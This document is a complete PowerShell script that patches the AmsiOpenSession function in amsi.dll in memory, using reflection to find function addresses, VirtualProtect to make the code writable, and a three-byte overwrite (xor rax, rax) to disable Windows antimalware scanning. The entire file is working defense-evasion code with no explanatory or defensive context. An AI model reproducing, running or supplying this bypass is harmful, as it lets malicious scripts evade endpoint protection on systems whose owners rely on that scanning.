# Function to obtain the address of a function from a module
function GetAddress {
    param (
        [string]$moduleName,
        [string]$functionName
    )

    # Load relevant assemblies
    $loadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies() |
                        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }
    $assemblyType = $loadedAssemblies.GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    # Find and invoke GetProcAddress to get the function address
    $getProcAddressMethods = $assemblyType.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' }
    $functionAddressList = @()

    $functionAddressList += $getProcAddressMethods[0].Invoke($null, @(
        ($assemblyType.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))

    return $functionAddressList[0]
}

# define a delegate type dynamically
function DefineDelegateType {
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [Type[]]$functionSignature,

        [Parameter(Position = 1)]
        [Type]$delegateType = [Void]
    )

    # Create a dynamic assembly to define the delegate type
    $dynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    # Define constructor and invoke method for the delegate type
    $constructorAttributes = 'RTSpecialName, HideBySig, Public'
    $constructorCallingConvention = [System.Reflection.CallingConventions]::Standard

    $dynamicAssembly.DefineConstructor(
        $constructorAttributes,
        $constructorCallingConvention,
        $functionSignature
    ).SetImplementationFlags('Runtime, Managed')

    $invokeMethodAttributes = 'Public, HideBySig, NewSlot, Virtual'
    $delegateReturnType = $delegateType

    $dynamicAssembly.DefineMethod(
        'Invoke', $invokeMethodAttributes, $delegateReturnType, $functionSignature
    ).SetImplementationFlags('Runtime, Managed')

    return $dynamicAssembly.CreateType()
}

# Obtain the address of the AmsiOpenSession function
$amsiOpenSessionAddress = GetAddress 'amsi.dll' 'AmsiOpenSession'

# Store the previous memory protection for later restoration
$previousProtection = 0

# Get a delegate for the VirtualProtect function
$virtualProtectDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (GetAddress 'kernel32.dll' 'VirtualProtect'),
    (DefineDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)

# Change memory protection 
$virtualProtectDelegate.Invoke($amsiOpenSessionAddress, 3, 0x40, [ref]$previousProtection)

# Define new bytes 
$newBytesToWrite = [byte[]] (0x48, 0x31, 0xc0)

# Write new bytes to the function
[System.Runtime.InteropServices.Marshal]::Copy($newBytesToWrite, 0, $amsiOpenSessionAddress, 3)

# Restore original memory protection
$virtualProtectDelegate.Invoke($amsiOpenSessionAddress, 3, 0x20, [ref]$previousProtection)
